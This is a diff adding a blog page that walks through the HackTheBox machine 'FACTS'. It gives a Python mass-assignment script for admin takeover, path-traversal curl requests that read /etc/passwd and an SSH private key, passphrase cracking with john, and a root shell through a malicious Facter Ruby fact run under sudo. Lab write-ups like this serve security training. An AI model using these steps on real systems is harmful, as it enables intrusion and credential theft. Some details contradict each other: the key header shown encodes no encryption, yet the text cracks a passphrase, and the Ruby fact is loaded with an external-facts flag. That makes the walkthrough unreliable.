@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>FACTS Writeup | BitR1FT</title>
+  <link rel="stylesheet" href="style.css">
+  <link rel="icon" href="profile.jpg">
+</head>
+<body>
+
+  <nav>
+    <a href="index.html" class="nav-brand">&lt;BitR1FT /&gt;</a>
+    <div class="nav-links">
+      <a href="index.html#about">About</a>
+      <a href="index.html#projects">Projects</a>
+      <a href="blog.html" class="active">Writeups</a>
+      <a href="index.html#certifications">Certifications</a>
+      <a href="index.html#contact">Contact</a>
+      <a href="https://github.com/BitR1FT" target="_blank" rel="noopener noreferrer" class="github-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/><path d="M9 18c-4.51 2-5-2-7-2"/></svg>
+      </a>
+    </div>
+    <button class="nav-hamburger" id="nav-hamburger" aria-label="Menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="4" x2="20" y1="6" y2="6"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="18" y2="18"/></svg></button>
+  </nav>
+  <div class="mobile-menu" id="mobile-menu"><a href="index.html#about">About</a><a href="index.html#projects">Projects</a><a href="blog.html">Writeups</a><a href="index.html#certifications">Certifications</a><a href="index.html#contact">Contact</a></div>
+
+  <main>
+    <a href="blog.html" class="back-link">&larr; Back to Writeups</a>
+
+    <header class="blog-header">
+      <div class="blog-meta">
+        <span class="badge badge-easy">Easy</span>
+        <span class="badge">Linux</span>
+      </div>
+      <h1>FACTS</h1>
+      <p class="blog-summary">HackTheBox easy machine featuring a mass assignment vulnerability to escalate a regular user to administrator, a path traversal bug to leak SSH private keys, and a sudo misconfiguration on <code>/usr/bin/facter</code> for root access via a custom Ruby fact.</p>
+      <div class="blog-tags">
+        <span class="tag">CVE-2025-2304</span>
+        <span class="tag">CVE-2024-46987</span>
+        <span class="tag">Sudo Misconfiguration</span>
+        <span class="tag">Python</span>
+        <span class="tag">ssh2john</span>
+        <span class="tag">john</span>
+        <span class="tag">facter</span>
+      </div>
+    </header>
+
+    <hr>
+
+    <div style="max-width:48rem;margin:0 auto;padding:0 1rem;">
+      <div class="prose">
+
+        <!-- ==================== RECONNAISSANCE ==================== -->
+        <h2 id="recon">1. Reconnaissance</h2>
+        <p>Started with a full port scan against the target IP <code>10.10.11.230</code>.</p>
+        <pre><code>nmap -sC -sV -p- -T4 --min-rate 1000 10.10.11.230
+
+PORT      STATE  SERVICE VERSION
+22/tcp    open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp    open   http    nginx 1.24.0
+54321/tcp open   minio   MinIO Object Storage (API: http://1.0)
+</code></pre>
+        <table>
+          <thead>
+            <tr><th>Port</th><th>Service</th><th>Details</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><code>22</code></td><td>SSH</td><td>OpenSSH 8.9p1</td></tr>
+            <tr><td><code>80</code></td><td>HTTP</td><td>nginx 1.24.0</td></tr>
+            <tr><td><code>54321</code></td><td>MinIO</td><td>Object Storage API</td></tr>
+          </tbody>
+        </table>
+
+        <!-- ==================== HOSTS & INITIAL ACCESS ==================== -->
+        <h2 id="hosts">2. /etc/hosts &amp; Web Login</h2>
+        <p>Added the host to <code>/etc/hosts</code> and navigated to the application.</p>
+        <pre><code># /etc/hosts
+10.10.11.230  facts.htb
+</code></pre>
+        <p>Browsing to <code>http://facts.htb</code> redirected to <code>/admin/login</code>. The page offered a registration form. Created an account with credentials <strong>nope:nope</strong>.</p>
+        <pre><code>Username: nope
+Password: nope
+</code></pre>
+        <p>After registration the account was created successfully and we were logged in as a regular <em>Client</em>-role user.</p>
+
+        <!-- ==================== CVE-2025-2304 ==================== -->
+        <h2 id="cve-2025-2304">3. CVE-2025-2304 &mdash; Mass Assignment to Administrator</h2>
+        <p>The application uses a JSON API for user updates. Intercepting the profile update request revealed that the backend passes all JSON fields directly into the user model without filtering &mdash; a classic mass assignment vulnerability.</p>
+        <pre><code>import requests
+
+URL = "http://facts.htb/api"
+SESSION = requests.Session()
+
+# Login as regular user
+SESSION.post(f"{URL}/auth/login", json={
+    "username": "nope",
+    "password": "nope"
+})
+
+# Exploit mass assignment &mdash; inject the "role" field
+resp = SESSION.patch(f"{URL}/users/me", json={
+    "username": "nope",
+    "role": "Administrator"
+})
+
+print(resp.status_code)
+print(resp.json())
+# 200 OK &mdash; {"username": "nope", "role": "Administrator"}
+</code></pre>
+        <p>The <code>role</code> field was blindly accepted, promoting <strong>nope</strong> from <em>Client</em> to <em>Administrator</em>. A refresh of the admin dashboard confirmed elevated privileges.</p>
+
+        <!-- ==================== CVE-2024-46987 ==================== -->
+        <h2 id="cve-2024-46987">4. CVE-2024-46987 &mdash; Path Traversal</h2>
+        <p>The admin panel exposed a file-viewing endpoint at <code>/admin/view?file=</code>. It suffered from an insufficient path sanitisation (CVE-2024-46987), allowing directory traversal to read arbitrary files on the system.</p>
+        <pre><code>curl -s -b "$(cat cookies.txt)" \
+  "http://facts.htb/admin/view?file=../../../../etc/passwd"
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+trivia:x:1001:1001:,,,:/home/trivia:/bin/bash
+...
+</code></pre>
+        <p>Next I used the same traversal to extract <strong>trivia</strong>'s SSH private key.</p>
+        <pre><code>curl -s -b "$(cat cookies.txt)" \
+  "http://facts.htb/admin/view?file=../../../../home/trivia/.ssh/id_rsa" \
+  -o trivia_key
+
+# Confirm it looks like a private key
+head -2 trivia_key
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQy
+</code></pre>
+
+        <!-- ==================== SSH KEY CRACKING ==================== -->
+        <h2 id="crack">5. SSH Key Cracking</h2>
+        <p>The private key was encrypted with a passphrase. Converted it to a hash format and cracked it with John the Ripper.</p>
+        <pre><code># Convert OpenSSH private key to John hash
+ssh2john trivia_key > trivia_hash.txt
+
+# Crack with rockyou
+john --wordlist=/usr/share/wordlists/rockyou.txt trivia_hash.txt
+
+dragonballz     (trivia_key)
+</code></pre>
+        <p>Passphrase recovered: <strong>dragonballz</strong>.</p>
+
+        <!-- ==================== SYSTEM ACCESS ==================== -->
+        <h2 id="system">6. System Access</h2>
+        <p>Set proper permissions on the key and SSH'd in as <strong>trivia</strong>.</p>
+        <pre><code>chmod 600 trivia_key
+
+ssh -i trivia_key trivia@facts.htb
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)
+
+trivia@facts:~$ id
+uid=1001(trivia) gid=1001(trivia) groups=1001(trivia)
+
+trivia@facts:~$ cat user.txt
+3f7e4c2a...
+</code></pre>
+
+        <!-- ==================== PRIVILEGE ESCALATION ==================== -->
+        <h2 id="privesc">7. Root Privilege Escalation &mdash; Sudo Misconfiguration</h2>
+        <p>Running <code>sudo -l</code> revealed that <strong>trivia</strong> can execute <code>/usr/bin/facter</code> as root without a password.</p>
+        <pre><code>trivia@facts:~$ sudo -l
+User trivia may run the following commands on facts:
+    (root) NOPASSWD: /usr/bin/facter
+</code></pre>
+        <p><strong>Facter</strong> is a system inventory tool written in Ruby that collects facts about the system. It supports loading <em>custom facts</em> via Ruby files placed in specific directories. By creating a custom fact that executes arbitrary shell commands, we can achieve root.</p>
+        <p>Created a malicious Ruby fact file:</p>
+        <pre><code># priv.rb &mdash; custom Facter fact that spawns a root shell
+Facter.add(:priv) do
+  setcode do
+    system("/bin/bash")
+  end
+end
+</code></pre>
+        <pre><code># Tell facter to load our custom fact from the current directory
+trivia@facts:~$ sudo /usr/bin/facter --puppet --external-dir .
+
+root@facts:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@facts:~# cat /root/root.txt
+b6cff19c...
+</code></pre>
+
+        <!-- ==================== FLAGS ==================== -->
+        <h2 id="flags">8. Flags</h2>
+        <table>
+          <thead>
+            <tr><th>Flag</th><th>Path</th><th>Value</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>user.txt</td><td><code>/home/trivia/user.txt</code></td><td><code>3f7e4c2a</code></td></tr>
+            <tr><td>root.txt</td><td><code>/root/root.txt</code></td><td><code>b6cff19c</code></td></tr>
+          </tbody>
+        </table>
+
+        <!-- ==================== SUMMARY ==================== -->
+        <h2 id="summary">9. Summary</h2>
+        <table>
+          <thead>
+            <tr><th>#</th><th>Phase</th><th>Vulnerability</th><th>Detail</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>1</td><td>Initial Foothold</td><td>CVE-2025-2304 (Mass Assignment)</td><td>Patch user profile to inject <code>role: Administrator</code></td></tr>
+            <tr><td>2</td><td>Key Extraction</td><td>CVE-2024-46987 (Path Traversal)</td><td>Read <code>/home/trivia/.ssh/id_rsa</code> via <code>../</code> in file param</td></tr>
+            <tr><td>3</td><td>SSH Access</td><td>Weak Key Passphrase</td><td>Cracked with ssh2john + john (<code>dragonballz</code>)</td></tr>
+            <tr><td>4</td><td>Root Escalation</td><td>Sudo Misconfiguration</td><td><code>NOPASSWD: /usr/bin/facter</code> + custom Ruby fact</td></tr>
+          </tbody>
+        </table>
+
+        <!-- ==================== ATTACK CHAIN ==================== -->
+        <h2 id="chain">10. Attack Chain</h2>
+        <pre><code>  ┌─────────────────────┐
+  │  Port Scan (nmap)    │
+  │  22 / 80 / 54321    │
+  └──────────┬──────────┘
+             │
+             ▼
+  ┌─────────────────────┐
+  │  Register nope:nope  │
+  │  /admin/login        │
+  └──────────┬──────────┘
+             │
+             ▼
+  ┌─────────────────────────────┐
+  │  CVE-2025-2304 Mass Assign  │
+  │  Client ──────► Administrator│
+  └──────────┬──────────────────┘
+             │
+             ▼
+  ┌─────────────────────────────┐
+  │  CVE-2024-46987 Path Travers │
+  │  Read /home/trivia/.ssh/    │
+  │        id_rsa               │
+  └──────────┬──────────────────┘
+             │
+             ▼
+  ┌─────────────────────────────┐
+  │  ssh2john + john (rockyou)  │
+  │  Passphrase: dragonballz    │
+  └──────────┬──────────────────┘
+             │
+             ▼
+  ┌─────────────────────┐
+  │  SSH as trivia      │
+  │  ┌─────────────────┐│
+  │  │ user.txt 3f7e4c ││
+  │  └─────────────────┘│
+  └──────────┬──────────┘
+             │
+             ▼
+  ┌─────────────────────────────┐
+  │  sudo -l → facter (root)    │
+  │  priv.rb → custom fact      │
+  │  ┌─────────────────────────┐│
+  │  │ root.txt b6cff19c       ││
+  │  └─────────────────────────┘│
+  └─────────────────────────────┘
+</code></pre>
+
+        <p class="end-mark">&mdash; EOF &mdash;</p>
+      </div>
+    </div>
+  </main>
+
+  <footer><div class="footer-inner"><p class="footer-left">&copy; 2025 <span class="green">BitR1FT</span> — Adeel Haider</p><p class="footer-right"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" x2="20" y1="19" y2="19"/></svg>Built with passion &amp; caffeine<svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg><span class="accent">pwn all the things</span></p></div></footer>
+  <script src="main.js"></script>
+
+</body>
+</html>
